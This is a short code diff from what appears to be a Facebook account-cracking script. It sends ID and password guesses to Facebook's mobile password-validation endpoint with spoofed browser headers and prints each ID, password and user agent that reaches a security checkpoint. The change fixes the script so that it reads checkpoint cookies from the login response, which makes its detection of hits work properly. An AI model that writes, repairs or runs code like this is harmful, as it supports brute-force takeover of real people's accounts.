@@ -1102,7 +1102,7 @@ def _async(idf,pwv):
 				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
 			}
             post = ses.post(f"https://free.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=wibu_head,allow_redirects=False)
-            if "checkpoint" in ses.cookies.get_dict().keys():
+            if "checkpoint" in post.cookies.get_dict().keys():
                 cp+=1
                 print('\n')
                 statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
